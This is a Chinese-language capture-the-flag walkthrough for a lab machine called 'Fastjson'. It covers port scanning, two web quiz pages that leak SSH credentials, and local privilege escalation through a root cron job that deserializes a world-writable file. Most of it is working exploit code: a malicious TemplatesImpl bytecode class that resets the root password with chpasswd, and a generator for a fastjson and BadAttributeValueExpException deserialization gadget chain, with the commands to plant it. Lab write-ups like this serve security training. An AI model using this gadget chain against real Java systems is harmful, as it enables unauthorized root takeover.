## Nmap

先扫全端口：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ nmap -p0-65535 192.168.205.220
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-10 00:17 -0400
Nmap scan report for 192.168.205.220
Host is up (0.0010s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8080/tcp open  http-proxy
MAC Address: 08:00:27:98:5E:D0 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 5.23 seconds
```

开放了 `22/80/8080`，优先看 Web。

## Web

80 端口只有一个很简单的首页：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.220 -i
HTTP/1.1 200 OK
Date: Wed, 10 Jun 2026 04:17:25 GMT
Server: Apache/2.4.67 (Unix)
Last-Modified: Sat, 25 Apr 2026 10:23:33 GMT
ETag: "6-650464614f50d"
Accept-Ranges: bytes
Content-Length: 6
Content-Type: text/html

index
```

目录扫描：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ dirsearch -q -u 192.168.205.220
[00:17:39] 200 -  820B  - http://192.168.205.220/cgi-bin/printenv
[00:17:39] 200 -    1KB - http://192.168.205.220/cgi-bin/test-cgi
[00:17:46] 403 -  318B  - http://192.168.205.220/server-status/
```

80 上只有 CGI 环境信息，暂时没有直接利用点，重点放到 8080。

访问 8080：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl 192.168.205.220:8080 -i
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Transfer-Encoding: chunked
Date: Wed, 10 Jun 2026 04:17:30 GMT

<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>公交车之谜</title>
...
```

页面是一个“公交车之谜”，表单提交到 `/`：

```html
<form action="/" method="post">
    <input type="number" name="answer" placeholder="输入数字" required>
</form>
```

题目提示：

```text
3 - 1 + 0.5 - 2 = ?
```

数学答案是 `0.5`，但是只接收整数。

```js
const userAnswer = parseInt(answerInput.value);
```

直接对后端测试：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ echo "=== 0.5 ==="; curl -s -i -X POST http://192.168.205.220:8080/ --data-urlencode 'answer=0.5'
echo "=== 0 ==="; curl -s -i -X POST http://192.168.205.220:8080/ --data-urlencode 'answer=0'

=== 0.5 ===
HTTP/1.1 302
Location: http://192.168.205.220:8080/baka
Content-Language: en-US
Content-Length: 0
Date: Wed, 10 Jun 2026 04:21:13 GMT

=== 0 ===
HTTP/1.1 302
Location: http://192.168.205.220:8080/quiz2jkdjw
Content-Language: en-US
Content-Length: 0
Date: Wed, 10 Jun 2026 04:21:13 GMT
```

访问第二关：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl http://192.168.205.220:8080/quiz2jkdjw
<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <title>琪露诺的Java魔法教室</title>
...
```

题目内容是：

```text
Class.forName() 和 ClassLoader.loadClass()
哪个会触发类的初始化阶段？
```

正确答案是 `Class.forName()`，提交：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ curl -s -i -X POST http://192.168.205.220:8080/quiz2jkdjw --data-urlencode 'answer=forName'
HTTP/1.1 200
Content-Type: text/html;charset=UTF-8
Content-Language: en-US
Transfer-Encoding: chunked
Date: Wed, 10 Jun 2026 04:21:58 GMT

<!DOCTYPE html>
...
<!--Cirno:999999999-->
</body>
</html>
```

页面注释直接给出了 SSH 凭据`Cirno:999999999`

## SSH

使用泄露的账号密码登录：

```bash
┌──(kali㉿kali)-[/mnt/hgfs/gx/x/tmp]
└─$ ssh Cirno@192.168.205.220
Cirno@192.168.205.220's password: 999999999
              _
__      _____| | ___ ___  _ __ ___   ___
\ \ /\ / / _ \ |/ __/ _ \| '_ ` _ \ / _ \
 \ V  V /  __/ | (_| (_) | | | | | |  __/
  \_/\_/ \___|_|\___\___/|_| |_| |_|\___|

Cirno@Fastjson:~$ id
uid=1000(Cirno) gid=1000(Cirno) groups=1000(Cirno)
```

读取 user flag：

```bash
Cirno@Fastjson:~$ cat user.txt
flag{f176c3af829faae619fb3d3b9aa6ae77}
```

## 枚举

先看 sudo：

```bash
Cirno@Fastjson:~$ sudo -l
[sudo] password for Cirno:
Sorry, user Cirno may not run sudo on Fastjson.
```

没有 sudo 权限。

枚举时有几个很扎眼的点：

```text
1. root 在跑 java -jar /root/web.jar
2. /usr/1.txt 为 root 拥有但全员可写
3. /var/opt/999.jar 和 /var/opt/tt.java 存在
4. /Baka* 文件持续被 root 生成
```

root 进程：

```bash
PID   USER     TIME  COMMAND
2298  root     0:57  java -jar /root/web.jar
```

异常文件：

```bash
Cirno@Fastjson:~$ ls -al /usr/1.txt
-rwxrwxrwx    1 root     root          3792 Jun  1 10:50 /usr/1.txt
```

文件内容开头：

```bash
Cirno@Fastjson:~$ head -c 20 /usr/1.txt; echo
rO0ABXNyAC5qYXZhe
```

`rO0AB` 是非常典型的 Java 序列化流经过 base64 编码后的特征。

根目录下还有一批 root 创建的空文件：

```bash
Cirno@Fastjson:/$ ls -al /Baka*
-rw-r--r--    1 root     root             0 Jun 10 12:11 /Baka0
-rw-r--r--    1 root     root             0 Jun 10 12:18 /Baka19
-rw-r--r--    1 root     root             0 Jun 10 12:19 /Baka2
-rw-r--r--    1 root     root             0 Jun 10 12:20 /Baka23
-rw-r--r--    1 root     root             0 Jun 10 12:22 /Baka98
...
```

结合 Web 题面中的 `baka` 元素，这些文件很像是某个命令执行 payload 的产物。

再用 pspy 看 root 定时任务：

```bash
Cirno@Fastjson:/tmp$ ./pspy64
2026/06/10 12:29:00 CMD: UID=0     PID=26143  | /bin/bash -c /usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
2026/06/10 12:30:00 CMD: UID=0     PID=26158  | /usr/sbin/crond -c /etc/crontabs -f
```

也就是 root 每分钟都会执行一次：

```bash
/usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
```

## 999.jar

查看 `/var/opt`：

```bash
Cirno@Fastjson:/var/opt$ ls -al
total 552
drwxr-xr-x    2 root     root          4096 May 28 12:30 .
drwxr-xr-x   13 root     root          4096 May  8 10:51 ..
-rw-r--r--    1 root     root        550077 May 28 12:26 999.jar
-rw-r--r--    1 root     root           605 May 28 12:30 tt.java
```

源码直接可读：

```bash
Cirno@Fastjson:/var/opt$ cat /var/opt/tt.java
import java.io.*;
import java.util.Base64;
import java.util.Scanner;

public class tt {
    public static void main(String[] args) throws Exception{
        Scanner scanner = new Scanner(new File("/usr/1.txt")).useDelimiter("\\A");
        if(scanner.hasNext()){
            String data = scanner.next();
            System.out.println(data);
            byte[] ass = Base64.getDecoder().decode(data);
            ByteArrayInputStream bais = new ByteArrayInputStream(ass);
            ObjectInputStream ois = new ObjectInputStream(bais);
            ois.readObject();
        }

    }
}
```

逻辑很清晰：

```text
读取 /usr/1.txt
-> base64 解码
-> ObjectInputStream.readObject()
```

因此这题的本地提权本质就是：

```text
控制 /usr/1.txt
-> 让 root 定时反序列化我们构造的对象
```

把 jar 拷到 `/tmp` 解开看依赖：

```bash
Cirno@Fastjson:/tmp$ cp /var/opt/999.jar .
Cirno@Fastjson:/tmp$ unzip -q 999.jar
Cirno@Fastjson:/tmp$ unzip -p 999.jar META-INF/MANIFEST.MF
Manifest-Version: 1.0
Build-Jdk-Spec: 1.8
Created-By: Maven Archiver 3.6.0
Main-Class: tt
```

jar 里带了完整 Fastjson：

```bash
Cirno@Fastjson:/tmp$ find . -name "*.class" | grep 'com/alibaba/fastjson' | head
./com/alibaba/fastjson/JSONPath$MultiPropertySegement.class
./com/alibaba/fastjson/JSONPath$MatchSegement.class
./com/alibaba/fastjson/JSONObject.class
./com/alibaba/fastjson/JSONWriter.class
./com/alibaba/fastjson/JSONArray.class
./com/alibaba/fastjson/JSON.class
...
```

但没有 commons-beanutils / commons-collections：

```bash
Cirno@Fastjson:/tmp$ find /tmp -name '*.class' | grep -i 'beanutils\|collections'
find: /tmp/tomcat-docbase.8080.221391655880685456: Permission denied
find: /tmp/tomcat.8080.311519346083039616: Permission denied
```

所以常规 ysoserial 链如 `CommonsBeanutils1` 会失败：

```bash
Exception in thread "main" java.lang.ClassNotFoundException: org.apache.commons.beanutils.BeanComparator
```

而 `Jdk7u21` 在目标 Java 8 上也不成立：

```bash
Exception in thread "main" java.io.InvalidObjectException: Non-annotation type in annotation serial stream
```

说明这题真正可用的链，不是通用 ysoserial，而是和原始 `/usr/1.txt` 一样的结构：

```text
BadAttributeValueExpException
-> fastjson JSONObject
-> TemplatesImpl
-> 加载恶意字节码
```

## Payload

### 编写恶意字节码类

在靶机 `/tmp` 下写一个继承 `AbstractTranslet` 的类，静态代码块里执行 `chpasswd`：

```java
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

public class Pwn extends AbstractTranslet {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c","printf 'root:root123\\n' | chpasswd"}).waitFor();
        } catch (Exception e) {}
    }

    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {}
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {}
}
```

保存为 `/tmp/Pwn.java` 后编译：

```bash
/usr/lib/jvm/java-1.8-openjdk/bin/javac -XDignore.symbol.file /tmp/Pwn.java
```

确认 class 已生成：

```bash
Cirno@Fastjson:/tmp$ ls -l /tmp/Pwn.class
-rw-r--r--    1 Cirno    Cirno         1078 Jun 10 12:56 /tmp/Pwn.class
```

### 编写序列化生成器

再写一个本地生成器，把 `Pwn.class` 塞进 `TemplatesImpl`，再用 `fastjson.JSONObject` 包裹，最后挂到 `BadAttributeValueExpException.val` 上并序列化输出。

生成器源码如下：

```java
import com.alibaba.fastjson.JSONObject;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javax.management.BadAttributeValueExpException;
import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

public class Gen {
    static void set(Object o, String n, Object v) throws Exception {
        Field f = o.getClass().getDeclaredField(n);
        f.setAccessible(true);
        f.set(o, v);
    }

    public static void main(String[] a) throws Exception {
        byte[] b = Files.readAllBytes(Paths.get("/tmp/Pwn.class"));

        TemplatesImpl t = new TemplatesImpl();
        set(t, "_bytecodes", new byte[][]{b});
        set(t, "_name", "Pwn");
        set(t, "_tfactory", new TransformerFactoryImpl());

        JSONObject j = new JSONObject();
        j.put("x", t);

        BadAttributeValueExpException e = new BadAttributeValueExpException(null);
        Field f = BadAttributeValueExpException.class.getDeclaredField("val");
        f.setAccessible(true);
        f.set(e, j);

        ByteArrayOutputStream bo = new ByteArrayOutputStream();
        ObjectOutputStream oo = new ObjectOutputStream(bo);
        oo.writeObject(e);
        oo.close();

        System.out.print(Base64.getEncoder().encodeToString(bo.toByteArray()));
    }
}
```

保存为 `/tmp/Gen.java`，编译时把 `999.jar` 加入 classpath：

```bash
Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/javac -XDignore.symbol.file -cp /var/opt/999.jar /tmp/Gen.java
```

然后生成 payload 覆盖 `/usr/1.txt`：

```bash
Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/java -cp /tmp:/var/opt/999.jar Gen > /usr/1.txt
```

确认内容是纯净的 base64：

```bash
tr -d 'A-Za-z0-9+/=' < /usr/1.txt | xxd
```

没有输出就说明没有脏字符，可以正常被 `Base64.getDecoder()` 解析。

## Root

可以等 cron 下一分钟自动触发，也可以直接手工执行测试：

```bash
Cirno@Fastjson:/tmp$ /usr/lib/jvm/java-1.8-openjdk/bin/java -jar /var/opt/999.jar
```

这一步会让 root 进程反序列化我们写入的对象，加载 `Pwn.class`，执行静态代码块，把 root 密码改成：

```text
root123
```

等cron触发，然后直接切换 root：

```bash
Cirno@Fastjson:/tmp$ su root
Password: root123
Fastjson:/tmp# id
uid=0(root) gid=0(root) groups=0(root),0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

也可以直接 SSH：

```bash
ssh root@192.168.205.220
```

读取 root flag：

```bash
Fastjson:~# cat /root/root.txt
flag{f8b134c9e5c4ab3c9787c29effad5e6a}
```